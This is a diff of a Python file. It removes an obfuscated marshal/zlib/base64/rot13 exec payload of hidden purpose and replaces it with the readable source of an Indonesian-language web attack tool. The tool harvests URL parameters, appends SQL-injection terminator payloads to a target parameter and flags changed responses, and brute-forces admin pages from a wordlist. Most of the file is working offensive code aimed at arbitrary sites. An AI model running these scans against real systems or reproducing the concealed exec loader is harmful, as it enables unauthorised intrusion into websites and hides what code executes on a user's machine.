@@ -1,2 +1,240 @@
-import marshal, base64, zlib, codecs
-exec(marshal.loads(zlib.decompress(base64.b64decode(codecs.decode('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', 'rot_13')))))
+import gevent
+from gevent.pool import Pool
+from concurrent.futures import ThreadPoolExecutor
+import threading
+import requests
+from bs4 import BeautifulSoup
+import urllib.parse
+import time
+from rich.console import Console
+from rich.table import Table
+from colorama import Fore, Style, init
+init(autoreset=True)
+console = Console()
+
+ascii_art = """
+       ▄▄▄▄▄▄▄▄▄▄▄▄▄
+    ▄██             ██▄
+  ██   ▄▄          ▄▄  ██
+ ██   ▄▄▄▄         ▄▄▄▄  ██
+ ██   ▀▀▀▀         ▀▀▀▀  ██
+  ██   ▀▀▀  HBW    ▀▀▀ ██
+    ▀██             ██▀
+      ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+          ▄▄▄▄▄▄▄
+         ▀ ▀ ▀ ▀ ▀
+        ▀▀▀▀▀▀▀▀▀▀▀
+"""
+console.print(f"[bold green]{ascii_art}[/bold green]")
+console.print("[bold yellow]⚡ Author  : [/bold yellow][green]hbwterminator[/green]")
+console.print("[bold yellow]🔗 GitHub  : [/bold yellow][green]https://github.com/TERARIAgM[/green]\n")
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+}
+
+URL_BALANCER_PAYLOADS = [
+    "--+-", "--+-", "--+ '--+ ", "')--+- '", "))--+- )", "-- ))-- )--+ ",
+    "-- -/*", "/*", "%23", "%23%23", "%60", "%00", ";%00", "%90", "'--+-", "'"
+]
+
+def print_log(message, color="green"):
+    console.print(f"[bold {color}]➤ {message}[/bold {color}]")
+def find_url_parameters(url):
+    """Mencari parameter di URL dan menyimpannya ke file"""
+    print_log("Mengecek URL untuk parameter...", "yellow")
+    try:
+        response = requests.get(url, headers=HEADERS, timeout=3)
+        if response.status_code == 200:
+            print_log(f"URL berhasil diakses: {url}", "cyan")
+            soup = BeautifulSoup(response.text, 'html.parser')
+            links = soup.find_all('a', href=True)
+            found_params = set()
+            
+            for link in links:
+                href = link['href']
+                parsed_url = urllib.parse.urlparse(href)
+                query_params = urllib.parse.parse_qs(parsed_url.query)
+                if query_params:
+                    for key, values in query_params.items():
+                        for value in values:
+                            full_url = urllib.parse.urljoin(url, href)
+                            found_params.add((key, full_url))
+
+            if found_params:
+                table = Table(title="Hasil Scan Parameter URL", show_header=True, header_style="bold cyan")
+                table.add_column("Parameter", style="bold yellow")
+                table.add_column("URL", style="bold green")
+
+                with open("parameters_found.txt", "w") as file:
+                    file.write("Hasil Scan Parameter URL:\n")
+                    file.write("=" * 50 + "\n")
+
+                    for param, full_url in sorted(found_params):
+                        table.add_row(param, full_url)
+                        file.write(f"Parameter: {param}\nURL: {full_url}\n\n")
+
+                console.print(table)
+                print_log(f"Total parameter ditemukan: {len(found_params)}", "cyan")
+                print_log("Hasil scan disimpan di 'parameters_found.txt'", "green")
+            else:
+                print_log("Tidak ada parameter ditemukan.", "red")
+        else:
+            print_log(f"Gagal mengakses URL: {url}. Status Code: {response.status_code}", "red")
+    except requests.RequestException as e:
+        print_log(f"Error: {e}", "red")
+
+def grep_links_and_resources(url):
+    """Mencari semua link dan resource di halaman"""
+    print_log("Mengekstrak semua link dan resource...", "yellow")
+    try:
+        response = requests.get(url, headers=HEADERS, timeout=3) 
+        if response.status_code == 200:
+            soup = BeautifulSoup(response.text, 'html.parser')
+            base_url = urllib.parse.urlparse(url)
+            base = f"{base_url.scheme}://{base_url.netloc}"
+            table = Table(title="Hasil Scan Link & Resource", show_header=True, header_style="bold cyan")
+            table.add_column("Jenis", style="bold yellow")
+            table.add_column("URL", style="bold green")
+            results = 0
+            for tag in soup.find_all(['a', 'link', 'script', 'img']):
+                link = None
+                if tag.name == 'a' and tag.get('href'):
+                    link = tag['href']
+                    jenis = "🔗 Link"
+                elif tag.name == 'link' and tag.get('href'):
+                    link = tag['href']
+                    jenis = "🎨 CSS"
+                elif tag.name == 'script' and tag.get('src'):
+                    link = tag['src']
+                    jenis = "📜 JavaScript"
+                elif tag.name == 'img' and tag.get('src'):
+                    link = tag['src']
+                    jenis = "🖼️ Gambar"
+                if link:
+                    if not link.startswith(("http://", "https://")):
+                        link = urllib.parse.urljoin(base, link)
+                    table.add_row(jenis, link)
+                    results += 1
+            console.print(table)
+            print_log(f"Total link dan resource ditemukan: {results}", "cyan")
+        else:
+            print_log(f"Gagal mengakses URL: {url}. Status Code: {response.status_code}", "red")
+    except requests.RequestException as e:
+        print_log(f"Error: {e}", "red")
+
+def scan_sql_injection(target_url):
+    """Otomatis deteksi parameter dan uji SQL Injection"""
+    console.print(f"\n[bold yellow]➤ Menguji SQL Injection pada {target_url}...[/bold yellow]\n")
+
+    parsed_url = urllib.parse.urlparse(target_url)
+    query_params = urllib.parse.parse_qs(parsed_url.query)
+
+    if not query_params:
+        console.print("[bold red]❌ Tidak ditemukan parameter dalam URL![/bold red]")
+        return
+
+    param = list(query_params.keys())[0]
+
+    table = Table(title="Hasil Pengujian SQL Injection", show_header=True, header_style="bold cyan")
+    table.add_column("Teknik", style="bold yellow")
+    table.add_column("URL yang Diuji", style="bold green")
+    table.add_column("Status", style="bold red")
+
+    normal_response = requests.get(target_url, headers=HEADERS)
+    normal_length = len(normal_response.text)
+
+    combined_payloads = {f"URL Balancer {i+1}": p for i, p in enumerate(URL_BALANCER_PAYLOADS)}
+    for name, payload in combined_payloads.items():
+        test_url = target_url.replace(f"{param}={query_params[param][0]}", f"{param}={query_params[param][0]}{payload}")
+        try:
+            start_time = time.time()
+            response = requests.get(test_url, headers=HEADERS)
+            end_time = time.time()
+
+            if "SLEEP(5)" in payload and (end_time - start_time) > 4:
+                status = "[bold green]Rentan (Time Delay Terdeteksi)[/bold green]"
+            elif abs(len(response.text) - normal_length) > 50:
+                status = "[bold green]Rentan (Response Berubah)[/bold green]"
+            else:
+                status = "[bold red]Tidak Rentan[/bold red]"
+
+        except requests.RequestException:
+            status = "[bold red]Error[/bold red]"
+
+        table.add_row(name, test_url, status)
+
+    console.print(table)
+def scan_url(target, path, found_urls):
+    """Fungsi untuk scan satu URL dengan threading"""
+    url = f"{target}/{path}"
+    try:
+        response = requests.get(url, headers=HEADERS, allow_redirects=False, timeout=5)
+        if response.status_code == 200:
+            console.print(f"[bold green]✓ Ditemukan: {url} (200 OK)[/bold green]")
+            found_urls.append(url)
+        elif response.status_code == 403:
+            console.print(f"[bold yellow]! Terlarang: {url} (403 Forbidden)[/bold yellow]")
+    except requests.exceptions.RequestException as e:
+        console.print(f"[bold red]❌ Error: {e}[/bold red]")
+
+def search_admin_panel(target, wordlist_file):
+    try:
+        with open(wordlist_file, "r") as f:
+            wordlist = [line.strip() for line in f.readlines()]
+    except FileNotFoundError:
+        console.print(f"[bold red]❌ File {wordlist_file} tidak ditemukan![/bold red]")
+        return
+
+    console.print("\n[bold yellow]🔍 Mencari halaman admin...[/bold yellow]\n")
+    found_urls = []
+
+    def scan_admin(path):
+        url = f"{target}/{path}"
+        try:
+            response = requests.get(url, headers=HEADERS, timeout=2, allow_redirects=False)
+            if response.status_code == 200:
+                console.print(f"[bold green]✓ Ditemukan: {url} (200 OK)[/bold green]")
+                found_urls.append(url)
+            elif response.status_code == 403:
+                console.print(f"[bold yellow]! Terlarang: {url} (403 Forbidden)[/bold yellow]")
+        except requests.RequestException:
+            pass  # Jangan print error agar lebih cepat
+
+    with ThreadPoolExecutor(max_workers=25) as executor:
+        executor.map(scan_admin, wordlist)
+
+    console.print("\n[bold cyan]✅ Scan Selesai![/bold cyan]")
+    if found_urls:
+        console.print("\n[bold green]🎯 Halaman admin ditemukan:[/bold green]")
+        for link in found_urls:
+            console.print(f"   - {link}")
+    else:
+        console.print("\n[bold red]❌ Tidak ada halaman admin ditemukan![/bold red]")
+
+def main():
+    print(Fore.CYAN + Style.BRIGHT + "Pilih mode scan:")
+    print(Fore.CYAN + "1. Scan Parameter URL")
+    print(Fore.CYAN + "2. Scan Link & Resource")
+    print(Fore.CYAN + "3. Scan SQL Injection")
+    print(Fore.CYAN + "4. Scan Halaman Admin")
+    choice = input(Fore.CYAN + "\nPilih (1/2/3/4): ")
+
+    if choice == "3":  # Kalau pilih Scan SQL Injection
+        print(Fore.YELLOW + "Contoh URL: https://example.id/gallery.php?id=1")
+        url = input(Fore.CYAN + "Masukkan URL target: ")
+    else:
+        url = input(Fore.CYAN + "\nMasukkan URL target: ")
+
+    if choice == "1":
+        find_url_parameters(url)
+    elif choice == "2":
+        grep_links_and_resources(url)
+    elif choice == "3":
+        scan_sql_injection(url)
+    elif choice == "4":
+        search_admin_panel(url, "wordlist.txt")
+    else:
+        print(Fore.RED + "❌ Pilihan tidak valid!")
+if __name__ == "__main__":
+    main()
+
